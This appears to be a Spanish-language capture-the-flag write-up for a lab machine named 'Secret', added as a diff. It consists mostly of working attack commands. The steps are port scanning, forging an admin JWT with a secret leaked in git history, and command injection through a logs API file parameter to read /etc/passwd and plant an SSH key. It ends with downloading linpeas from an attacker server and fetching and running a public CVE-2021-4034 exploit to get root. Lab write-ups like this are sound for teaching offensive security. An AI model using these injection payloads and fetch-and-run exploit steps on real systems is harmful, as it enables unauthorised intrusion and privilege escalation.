@@ -1,0 +1,126 @@
+[+]
+# Nmap 7.92 scan initiated Tue Mar 15 17:28:11 2022 as: nmap --open -p- -n -Pn -vvv --min-rate 5000 -oG allPorts 10.10.11.120
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.11.120 ()	Status: Up
+Host: 10.10.11.120 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
+
+[+]
+Open http://10.10.11.120/
+
+
+*REGISTER USER*
+[+]
+POST http://localhost:3000/api/user/register
+
+[+]
+{
+	"name": "dasith",
+	"email": "root@dasith.works",
+	"password": "Kekc8swFgD6zU"
+  }
+  
+[+]
+curl -i -X POST -H 'Content-Type: application/json' -d '{ "name": "kyra01", "email": "kyra@dasith.works", "password": "kyra01" }'
+http://10.10.11.120:3000/api/user/register
+  
+[+]
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 17
+ETag: W/"11-MIAQiuwVU7en4DefRnTHq4kCdCY"
+Date: Wed, 16 Mar 2022 13:06:14 GMT
+Connection: keep-alive
+
+{"user":"x"}
+
+
+
+*LOGIN USER*
+[+]
+curl -i -X POST -H 'Content-Type: application/json' -d '{ "email": "x@dasith.works", "password": "x" }'
+http://10.10.11.120:3000/api/user/login
+
+[+]
+if success you get the auth-token
+
+[+]
+You should send the auth-token in the header if you need to do vertify token
+
+[+]
+curl -w '\n' -H 'auth-token:xxx' http://10.10.11.120/api/priv
+
+[+]
+{"role":{"role":"you are normal user","desc":"x"}}
+
+
+[+]
+Revisando, el token secret no es el correcto pero vemos que en .git han habido cambios, veámoslos;
+
+[+]
+git diff HEAD~2
+
+[+]
+Token secret = xxxxxxxxxxxxxx
+
+[+]
+En JWT cambiamos los parametros name y email, por los que nos indica la pagina web.
+Añadimos el token secreto correcto...
+
+[+]
+curl -w '\n' -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMzNWYyMTkzYzQzYjA0NWVmYzA4NDAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3NTMzOTY1fQ.Mp8dboe3ZbpWTUGpZwFdre9p69pnIJXzWOAARC9ABw0' http://10.10.11.120/api/priv
+{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
+
+[+]
+WebShell de apoyo
+
+[+]
+Mostrando usuarios
+curl -i -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMzNWYyMTkzYzQzYjA0NWVmYzA4NDAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3NTMzOTY1fQ.Mp8dboe3ZbpWTUGpZwFdre9p69pnIJXzWOAARC9ABw0'
+'http://10.10.11.120/api/logs?file=index.js;cat+/etc/passwd' | sed 's/\\n/n\n/g'
+
+[+]
+Generamos una clave id_rsa
+ssh-keygen -t rsa
+
+[+]
+Exportamos la clave rsa al usuario dasith para conectarnos atraves de ssh
+curl -i -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMzNWYyMTkzYzQzYjA0NWVmYzA4NDAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3NTMzOTY1fQ.Mp8dboe3ZbpWTUGpZwFdre9p69pnIJXzWOAARC9ABw0' 
+-G --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo 'ssh-rsa XXXXXXXXX' >> /home/dasith/.ssh/authorized_keys" http://10.10.11.120/api/logs
+
+
+[+]
+ssh dasith@IP
+dasith@secret:~$ ls
+local-web  user.txt
+
+[+]
+Escalar Privilegios
+
+[+]
+Desde Maquina Hacker
+sudo python3 -m http.server 80
+
+[+]
+Desde Maquina Victima
+wget http://xxx.x.x.x/linpeas.sh
+
+[+]
+chmod + x linpeas.sh
+./linpeas.sh
+
+[+]
+Vulnerable to: CVE-2021-4034
+
+[+]
+wget https://raw.githubusercontent.com/hackingyseguridad/CVE-2021-4034/main/CVE-2021-4034.sh
+
+[+]
+chmod +x CVE-2021-4034.sh
+
+[+]
+./CVE-2021-4034.sh
+
+[+]
+root@secret:/root# ls
+root.txt  snap
